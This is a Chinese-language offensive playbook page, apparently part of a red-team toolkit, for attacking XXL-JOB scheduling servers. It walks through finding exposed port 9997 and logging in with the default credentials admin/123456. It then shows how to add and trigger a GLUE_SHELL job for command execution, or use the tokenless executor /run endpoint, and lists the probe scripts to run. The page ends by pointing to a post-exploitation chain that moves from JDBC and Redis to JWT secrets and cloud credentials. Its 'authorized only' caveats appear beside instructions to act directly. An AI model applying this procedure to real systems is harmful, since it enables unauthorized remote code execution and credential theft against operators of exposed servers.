# XXL-JOB 调度中心 / 执行器手法

> 探针：`炼蛊房/xxljob_admin_probe.py`（管理台 L1/L2）  
> 指纹：`炼蛊房/java_web_surface_probe.py --stack xxljob` · `tools/1day-kit/custom-templates/xxljob-unauth-surface.yaml`  
> 杀招：`差事府·胶令`  
> 分流：`凤九歌·天地歌.md`  
> 红线：仅授权。登录 + 列执行器后 **GLUE / 执行器 `/run` 授权内直接做**。改超管密 / 清任务先问。

---

## 1. 一句话

公网 `:9997` / `/xxl-job-admin/` 常见默认 `admin/123456`。进管理台后 **GLUE_SHELL/PYTHON/JAVA 就是平台内建 RCE**（不必打执行器 CVE）。执行器空 token `/run` 是另一条，并列不要互相替代。

---

## 2. 组合链（默认打到 L2）

```
FOFA/测绘 port=9997 或路径 /xxl-job-admin/
  → POST /xxl-job-admin/login  admin/123456
     成功：Set-Cookie XXL_JOB_LOGIN_IDENTITY 或 302 /index 或 JSON code:200
  → POST jobgroup/pageList  → 在线执行器（常 Docker bridge :9998）
  → POST jobinfo/pageList   → 已有任务
  → jobinfo/add glueType=GLUE_SHELL + jobinfo/trigger + joblog/pageList（授权内直接做）
```

单台约 10 分钟；弱口中了执行器在线即可复现。容器常 `uid=0`，业务盘可能挂在 `/app/volumn`——只列路径，不默认翻盘。

---

## 3. 立刻跑

```bash
python3 炼蛊房/xxljob_admin_probe.py --base http://授权IP:9997 --case <案>
python3 炼蛊房/java_web_surface_probe.py -u http://授权IP:9997 --stack xxljob --case <案>
python3 tools/1day-kit/od_kit.py nuclei --url http://授权IP:9997 --case <案> \
  --template-id xxljob-unauth-surface
```

---

## 4. 档位

| 档 | 动作 | 成功证据 |
|----|------|----------|
| **L1** | UI / 「分布式任务调度平台」 | 确认 XXL-JOB |
| **L2** | 默认口或未授权 API + `jobgroup/pageList` | Cookie + 在线执行器地址 |
| **L3** | GLUE add+trigger **或** 执行器 `/run`（授权内直接做） | 日志回显 `uid=` / 授权标记文件 |

登录判定必须三选一，**不要只认 JSON `code:200`**（不少版只 302+Cookie）。

阴性 → Nacos / Actuator / 业务 API。禁止无授权扫全网 9997/9999。

---

## 5. L3 要点（先问再做）

`jobinfo/add`：`glueType=GLUE_SHELL` · `executorHandler=glueJobHandler` · `glueSource` 授权内最小证明（`id`/`hostname`）。  
`jobinfo/trigger` → `joblog/pageList` 回读。  
测完删除临时任务。不要默认写 `authorized_keys` / `cron.d`。

执行器另一面：`:9998` / `:9999` `/run` · `/beat`，空 `XXL-JOB-ACCESS-TOKEN`。

---

## 6. L3 之后：后渗透链

GLUE 拿到 shell 后 **不要停在 `id`/`whoami`**，交接到：

- **Skill**：`xxljob-postex-infra-chain`
- **Playbook**：`传承/差事府·后手.md`

7 步链：JAR→YML→JDBC→Redis→JWT→bcrypt→云凭据。实战案例见 `xxljob-combo-20260901`。
